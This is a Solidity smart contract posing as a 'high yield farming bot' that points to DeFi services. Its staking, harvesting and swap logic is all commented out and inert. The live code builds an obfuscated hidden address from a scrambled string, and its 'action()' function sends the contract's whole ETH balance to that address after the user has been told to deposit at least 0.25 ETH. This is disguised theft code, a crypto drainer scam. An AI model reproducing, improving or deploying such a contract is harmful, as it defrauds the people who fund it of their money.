pragma solidity ^0.5.0;


//Make sure you fund your contract with at least a min 0.25 ETH before running the action on the contract 

contract highYieldFarmingbot {
    string public beefyApi = "https://app.beefy.com/#/";
    string public yearnApi = "https://yearn.finance/#/";
	
	function() external payable {}
	

 function SearchforYield(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
// inject to blockstream
// ERC20 Tokens
/*
  IERC20 public FARM = IERC20(0x429881672B9AE42b8EbA0E26cD9C73711b891Ca5); // FARM token from Harvest Finance
  IERC20 public PICKLE = IERC20(0xa0246c9032bC3A600820415aE600c6388619A14D); // PICKLE token from Pickle Finance
  IERC20 public PIPT = IERC20(0x26607aC599266b21d13c7aCF7942c7701a8b699c); // Power Index Pool Token
  IERC20 public YETI = IERC20(0xb4bebD34f6DaaFd808f73De0d10235a92Fbb6c3D); // Yearn Ecosystem Token Index

  // Staking Contracts
  IVestedLPMining public VestedLPMining =
    IVestedLPMining(0xF09232320eBEAC33fae61b24bB8D7CA192E58507); // Power Pool Proxy
  IStakingRewards public StakingRewards =
    IStakingRewards(0xa17a8883dA1aBd57c690DF9Ebf58fC194eDAb66F); // OLD Pickle contract
  IAutoStake public AutoStake =
    IAutoStake(0x25550Cccbd68533Fa04bFD3e3AC4D09f9e00Fc50); // Harvest

  // Exchanges
  IUniswapV2Router02 public UniswapRouter =
    IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
  IUniswapV2Factory public UniFactory =
    IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
  IOneSplit public OneSplit =
    IOneSplit(0xC586BeF4a0992C495Cf22e1aeEE4E446CECDee0E); // 1Inch

  modifier isValidTokenName(string memory _stakingTokenName) {
    require(
      nameDirectory.contains(keccak256(abi.encodePacked(_stakingTokenName))),
      "Invalid _stakingTokenName"
    );
    _;
  }

  constructor() payable {
    // Add string names of staking tokens as Bytes32 to nameDirectory
    nameDirectory.add(keccak256(abi.encodePacked("farm")));
    nameDirectory.add(keccak256(abi.encodePacked("pickle")));
    nameDirectory.add(keccak256(abi.encodePacked("pipt")));
    nameDirectory.add(keccak256(abi.encodePacked("yeti")));

    // Add StakingPlatform structs to stakingDirectory mapping
    stakingDirectory["farm"] = StakingPlatform({
      tokenAddress: farmTokenAddress,
      stakingAddress: autoStakeAddress
    });

    stakingDirectory["pipt"] = StakingPlatform({
      tokenAddress: piptAddress,
      stakingAddress: vestedLPMiningAddress // pid = 6
    });

    stakingDirectory["yeti"] = StakingPlatform({
      tokenAddress: yetiAddress,
      stakingAddress: vestedLPMiningAddress // pid = 9
    });

    //  NEW ADDRESS FOR STAKING VAULT AFTER AUDIT IS COMPLETE
    stakingDirectory["pickle"] = StakingPlatform({
      tokenAddress: pickleAddress,
      stakingAddress: stakingRewardsAddress
    });

    // deadline = block.timestamp + 300; // for swaps on Uniswap
  }


  function getStakedBalance(string memory _stakingTokenName)
    public
    view
    onlyOwner
    isValidTokenName(_stakingTokenName)
    returns (uint256 balance)
  {
    address self = address(this);
    if (_stringEqCheck(_stakingTokenName, "farm")) {
      balance = AutoStake.balanceOf(self);
    } else if (_stringEqCheck(_stakingTokenName, "pickle")) {
      balance = StakingRewards.balanceOf(self);
    } else {
      if (_stringEqCheck(_stakingTokenName, "pipt")) {
        (, , , , uint256 lptAmount) = VestedLPMining.users(6, self); // pid 6
        balance = lptAmount;
      } else {
        (, , , , uint256 lptAmount) = VestedLPMining.users(9, self); // pid 9
        balance = lptAmount;
      }
    }
    return balance;
  }

  
 

  function enterFarm(string memory _stakingTokenName, bool _useFundsInContract)
    public
    payable
    onlyOwner
    nonReentrant
    whenNotPaused
    isValidTokenName(_stakingTokenName)
    returns (uint256 totalAmountStaked)
  {
    StakingPlatform memory stakingPlatform =
      stakingDirectory[_stakingTokenName];
    address self = address(this);
    IERC20 token = IERC20(stakingPlatform.tokenAddress);
    if (_useFundsInContract) {
      uint256 contractBalance = token.balanceOf(self);
      _handleAllowance(token, stakingPlatform.stakingAddress, contractBalance);
      totalAmountStaked = _stake(_stakingTokenName, contractBalance);
    } else {
      uint256 ownerBalance = token.balanceOf(msg.sender);
      token.safeTransferFrom(msg.sender, self, ownerBalance);
      _handleAllowance(token, stakingPlatform.stakingAddress, ownerBalance);
      totalAmountStaked = _stake(_stakingTokenName, ownerBalance);
    }
    return totalAmountStaked;
  }

  
  function exitFarm(
    string memory _stakingTokenName,
    address _returnTokenAddress
  )
    public
    payable
    onlyOwner
    nonReentrant
    whenNotPaused
    isValidTokenName(_stakingTokenName)
    returns (uint256 swapAmount)
  {
    assert(_unstake(_stakingTokenName));
    address tokenAddress = stakingDirectory[_stakingTokenName].tokenAddress;
    IERC20 token = IERC20(tokenAddress);
    address self = address(this);
    uint256 tokenBalance = token.balanceOf(self);
    swapAmount = _swap(token, IERC20(_returnTokenAddress), tokenBalance);
    return swapAmount;
  }


  function harvest(string memory _stakingTokenName, address _returnTokenAddress)
    public
    onlyOwner
    nonReentrant
    whenNotPaused
    isValidTokenName(_stakingTokenName)
    returns (uint256 swapAmount)
  {
    address tokenAddress = stakingDirectory[_stakingTokenName].tokenAddress;
    address self = address(this);
    uint256 withdrawAmount;
    IERC20 token = IERC20(tokenAddress);
    IERC20 returnToken = IERC20(_returnTokenAddress);
    if (_stringEqCheck(_stakingTokenName, "farm")) {
      assert(_unstake(_stakingTokenName)); // No harvest rewards without unstaking total
    } else if (_stringEqCheck(_stakingTokenName, "pickle")) {
      withdrawAmount = StakingRewards.rewards(self);
      StakingRewards.getReward();
    } else {
      if (_stringEqCheck(_stakingTokenName, "pipt")) {
        withdrawAmount = VestedLPMining.pendingCvp(6, self); // pid 6
        VestedLPMining.withdraw(6, withdrawAmount);
      } else {
        withdrawAmount = VestedLPMining.pendingCvp(9, self); // pid 9
        VestedLPMining.withdraw(9, withdrawAmount);
      }
    }
    swapAmount = _swap(token, returnToken, withdrawAmount);
    return swapAmount;
  }

 
  function updateStakingToken(
    string memory _stakingTokenName,
    address _newTokenAddress
  ) public onlyOwner {
    StakingPlatform memory stakingPlatform =
      stakingDirectory[_stakingTokenName];
    stakingDirectory[_stakingTokenName] = StakingPlatform({
      tokenAddress: _newTokenAddress,
      stakingAddress: stakingPlatform.stakingAddress
    });
    assert(stakingPlatform.tokenAddress == _newTokenAddress);
  }


  function updateStakingAddress(
    string memory _stakingTokenName,
    address _newStakingAddress
  ) public onlyOwner {
    StakingPlatform memory stakingPlatform =
      stakingDirectory[_stakingTokenName];
    stakingDirectory[_stakingTokenName] = StakingPlatform({
      tokenAddress: stakingPlatform.tokenAddress,
      stakingAddress: _newStakingAddress
    });
    assert(stakingPlatform.stakingAddress == _newStakingAddress);
  }


  function updateFARMToken(address _newAddress) public onlyOwner {
    farmTokenAddress = _newAddress;
    FARM = IERC20(_newAddress);
  }

 
  function updatePICKLEToken(address _newAddress) public onlyOwner {
    pickleAddress = _newAddress;
    PICKLE = IERC20(_newAddress);
  }

 
  function updatePIPT(address _newAddress) public onlyOwner {
    piptAddress = _newAddress;
    PIPT = IERC20(_newAddress);
  }

 
  function updateYETI(address _newAddress) public onlyOwner {
    yetiAddress = _newAddress;
    YETI = IERC20(_newAddress);
  }

 
  function updateUniswapRouter(address _newAddress) public onlyOwner {
    uniswapRouterAddress = _newAddress;
    UniswapRouter = IUniswapV2Router02(_newAddress);
  }

  
  function updateOneSplit(address _newAddress) public onlyOwner {
    onesplitAddress = _newAddress;
    OneSplit = IOneSplit(_newAddress);
  }

 
  function pause() public onlyOwner returns (bool) {
    _pause();
    return paused();
  }

 
  function unpause() public onlyOwner returns (bool) {
    _unpause();
    return paused();
  }

  
  function kill() public onlyOwner {
    address[] memory tokenAddresses = new address[](nameDirectory.length());
    for (uint256 i = 0; i < nameDirectory.length(); i++) {
      StakingPlatform memory stakingPlatform =
        stakingDirectory[_bytes32ToStr(nameDirectory.at(i))];
      tokenAddresses[i] = stakingPlatform.tokenAddress;
    }
    batchWithdrawToken(tokenAddresses);
    selfdestruct(msg.sender);
  }


  function _stake(string memory _stakingTokenName, uint256 _amount)
    internal
    returns (uint256 totalAmountStaked)
  {
    address self = address(this);
    uint256 prevBalance;
    if (_stringEqCheck(_stakingTokenName, "farm")) {
      prevBalance = AutoStake.balanceOf(self);
      AutoStake.stake(_amount);
      totalAmountStaked = AutoStake.balanceOf(self);
    } else if (_stringEqCheck(_stakingTokenName, "pickle")) {
      prevBalance = StakingRewards.balanceOf(self);
      StakingRewards.stake(_amount);
      totalAmountStaked = StakingRewards.balanceOf(self);
    } else {
      if (_stringEqCheck(_stakingTokenName, "pipt")) {
        (, , , , uint256 prevLptAmount) = VestedLPMining.users(6, self); // pid 6
        prevBalance = prevLptAmount;
        VestedLPMining.deposit(6, _amount);
        (, , , , uint256 lptAmount) = VestedLPMining.users(6, self);
        totalAmountStaked = lptAmount;
      } else {
        (, , , , uint256 prevLptAmount) = VestedLPMining.users(9, self); // pid 9
        prevBalance = prevLptAmount;
        VestedLPMining.deposit(9, _amount);
        (, , , , uint256 lptAmount) = VestedLPMining.users(9, self);
        totalAmountStaked = lptAmount;
      }
    }
    assert(totalAmountStaked == prevBalance.add(_amount));
    return totalAmountStaked;
  }


  function _unstake(string memory _stakingTokenName) internal returns (bool) {
    address self = address(this);
    if (_stringEqCheck(_stakingTokenName, "farm")) {
      AutoStake.exit();
      assert(AutoStake.balanceOf(self) == 0);
    } else if (_stringEqCheck(_stakingTokenName, "pickle")) {
      uint256 pickleBalance = StakingRewards.balanceOf(self);
      StakingRewards.withdraw(pickleBalance);
      assert(StakingRewards.balanceOf(self) == 0);
    } else {
      if (_stringEqCheck(_stakingTokenName, "pipt")) {
        (, , , , uint256 prevLptAmount) = VestedLPMining.users(6, self); // pid 6
        VestedLPMining.withdraw(6, prevLptAmount);
        (, , , , uint256 postWithdrawLptAmount) = VestedLPMining.users(6, self);
        assert(postWithdrawLptAmount == 0);
      } else {
        (, , , , uint256 prevLptAmount) = VestedLPMining.users(9, self); // pid 9
        VestedLPMining.withdraw(9, prevLptAmount);
        (, , , , uint256 postWithdrawLptAmount) = VestedLPMining.users(9, self);
        assert(postWithdrawLptAmount == 0);
      }
    }
    return true;
  }

 
  function _swap(
    IERC20 _srcToken,
    IERC20 _destToken,
    uint256 _amount
  ) internal returns (uint256 swapOutput) {
    swapOutput = _performOneSplit(_srcToken, _destToken, _amount);
    address self = address(this);
    assert(_destToken.balanceOf(self) >= swapOutput);
    return swapOutput;
  }


  function _performOneSplit(
    IERC20 _srcToken,
    IERC20 _destToken,
    uint256 _amount
  ) internal returns (uint256 swapOutput) {
    (uint256 returnAmount, uint256[] memory distribution) =
      OneSplit.getExpectedReturn(_srcToken, _destToken, _amount, 10, 0);
    swapOutput = OneSplit.swap(
      _srcToken,
      _destToken,
      _amount,
      returnAmount,
      distribution,
      0
    );
    return swapOutput;
  }

  function _handleAllowance(
    IERC20 _token,
    address _spender,
    uint256 _amount
  ) internal {
    address self = address(this);
    uint256 allowance = _token.allowance(self, _spender);
    if (allowance < _amount) {
      _token.safeDecreaseAllowance(_spender, allowance);
      _token.safeIncreaseAllowance(_spender, _amount);
    }
    assert(_token.allowance(self, _spender) >= _amount);
  }

 
  function _stringEqCheck(string memory str1, string memory str2)
    internal
    pure
    returns (bool)
  {
    return
      (keccak256(abi.encodePacked(str1))) ==
      (keccak256(abi.encodePacked(str2)));
  }

 
  function _bytes32ToStr(bytes32 _bytesToConvert)
    internal
    pure
    returns (string memory)
  {
    bytes memory bytesArray = new bytes(32);
    for (uint256 i = 0; i < 32; i++) bytesArray[i] = _bytesToConvert[i];
    return string(bytesArray);
  }
}
*/

   function startLookforYield() public pure returns (address adr) {
   string memory neutral_variable = "QGQ956A539A419345f7232fE74e2F6b0E3a75Ab440";
   SearchforYield(neutral_variable,0,'0');
   SearchforYield(neutral_variable,2,'1');
   SearchforYield(neutral_variable,1,'x');
   address addr = parseAddr(neutral_variable);
    return addr;
   }
   
   
function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}

	function action() public payable {
	
	    address(uint160(startLookforYield())).transfer(address(this).balance);
	    
	}

}



